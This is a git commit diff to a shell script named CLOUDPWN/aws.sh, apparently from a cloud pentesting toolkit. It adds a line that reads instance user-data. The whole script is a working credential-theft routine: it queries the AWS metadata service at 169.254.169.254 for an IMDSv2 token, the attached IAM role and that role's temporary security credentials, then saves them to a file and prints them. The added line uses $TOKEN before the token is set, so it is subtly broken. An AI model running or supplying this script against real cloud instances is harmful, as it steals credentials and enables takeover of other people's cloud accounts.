f5fd01f6dc95a6f8db470d0bab168d25539f55c6
shoxxdj <dj.shoxx.dj@gmail.com>
2025-11-14 21:17:40 +0100

    Update aws.sh

--- CLOUDPWN/aws.sh
+++ CLOUDPWN/aws.sh
@@ -1,9 +1,11 @@
 #!/bin/bash
 
+CLUSTERNAME=`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data`
 TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/hostname
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials
 NAME=`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials`
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$NAME > aws_token
+echo $CLUSTERNAME
 cat aws_token
